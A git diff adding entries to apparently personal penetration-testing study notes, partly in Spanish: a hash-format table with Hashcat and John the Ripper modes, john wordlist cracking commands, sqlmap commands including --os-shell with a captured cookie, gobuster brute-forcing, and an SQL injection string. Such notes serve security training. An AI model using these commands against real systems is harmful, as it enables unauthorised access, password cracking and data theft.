@@ -916,6 +916,30 @@ Is a tool for enumerating information from Windows and Samba systems. It is used
 	- “-m”: type hash we are cracking (for example 0 = MD5).
 	- “-a 0”: designates a dictionary attack.
 
+> hashes
+
+# Formatos de Hash Más Comunes
+
+| **Hash**       | **Descripción**                          | **Hashcat Mode** | **John the Ripper Format** |
+|-----------------|------------------------------------------|------------------|----------------------------|
+| **MD5**         | Algoritmo muy usado en contraseñas y verificaciones. | `-m 0`           | `Raw-MD5`                  |
+| **SHA-1**       | Usado en certificados y contraseñas.     | `-m 100`         | `Raw-SHA1`                 |
+| **SHA-256**     | Más seguro que SHA-1, usado ampliamente. | `-m 1400`        | `Raw-SHA256`               |
+| **SHA-512**     | Seguridad alta, usado en sistemas modernos. | `-m 1700`     | `Raw-SHA512`               |
+| **NTLM**        | Usado en autenticación de Windows.       | `-m 1000`        | `NT`                       |
+| **bcrypt**      | Hash fuerte para contraseñas (cost configurable). | `-m 3200` | `bcrypt`                   |
+| **LM**          | Sistema antiguo de Windows (inseguro).   | `-m 3000`        | `LM`                       |
+| **MySQL 323**   | Hash antiguo de contraseñas MySQL.       | `-m 200`         | `mysql`                    |
+| **MySQL 5.x**   | MySQL más moderno con SHA-1.             | `-m 300`         | `mysql-sha1`               |
+| **WordPress**   | Contraseñas de WordPress (MD5 con salt). | `-m 400`         | `phpass`                   |
+| **Cisco PIX**   | Usado en configuraciones de Cisco (MD5). | `-m 2400`        | `pix-md5`                  |
+
+
+- john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
+
+- john --show --format=Raw-MD5 hash.txt
+
+
 >Crackstation
 - https://crackstation.net/
 
@@ -1840,6 +1864,10 @@ $ sqlmap -u "URL" --cookie="captured cookie of logged-in user" -D <DATABASE_NAME
 $ sqlmap -u "URL" --cookie="captured cookie of logged-in user" -D <DATABASE_NAME> -T <TABLE_NAME> --columns # For Column names
 $ sqlmap -u "URL" --cookie="captured cookie of logged-in user" -D <DATABASE_NAME> -T <TABLE_NAME> --dump # Dump Table
 ```
+- ` sqlmap -u "URL" --cookie="captured cookie of logged-in user" --os-shell`
+
+- TASKLIST
+- HELP
 
 **Suggested lectures:** SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMap THM Free Room)
 
@@ -1858,6 +1886,7 @@ $ sqlmap -r <txt_file_from_burpsuite> -D <database_name> --tables --columns
 $ sqlmap -r <txt_file_from_burpsuite> -D <database_name> --dump
 $ sqlmap -r <txt_file_from_burpsuite> -D <database_name> --tables -T users
 ```
+
 
 **Suggested lectures:** SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMap THM Free Room)
 
@@ -2308,6 +2337,7 @@ LHOST=10.10.1.13 LPORT=4444 –f raw –o Backdoor.apk`
 - mqtt (Protocol Standard for IoT Messaging)
 - bevywise IoT simulator - Windows 
 - runsimulator.bat
+- info:Publish message 
 
 
 ----
@@ -2578,3 +2608,22 @@ Content-Type: application/x-php`
 - Get-ChildItem -Path C:\ -Recurse -Include secret.txt -ErrorAction SilentlyContinue
 
 - nmap —script smb-os-discovery ip 
+
+
+>sql Windows Server
+
+- sqlmap -h
+## Parámetros de Línea de Comandos
+
+- `-u` (URL de destino): Especifica la URL que se va a probar.
+- `--data` (Cadena de datos para enviar mediante POST): Ejemplo: `"id=1"`.
+- `--random-agent` (Usar un valor de User-Agent HTTP seleccionado aleatoriamente): Esto selecciona de manera aleatoria un valor para el encabezado `User-Agent`.
+- `-p TESTPARAMETER` (Parámetro(s) que se pueden probar): Especifica los parámetros que se van a probar en el objetivo.
+- `--level=LEVEL` (Nivel de pruebas a realizar): Rango de 1 a 5, por defecto es 1.
+- `--risk=RISK` (Riesgo de las pruebas a realizar): Rango de 1 a 3, por defecto es 1.
+
+
+- gobuster dir -u http://x.x.x.x -w /home/kali/Downloads/rockyou.txt -t 50
+
+- dsdasdsa' or 1=1
+- document.cookie
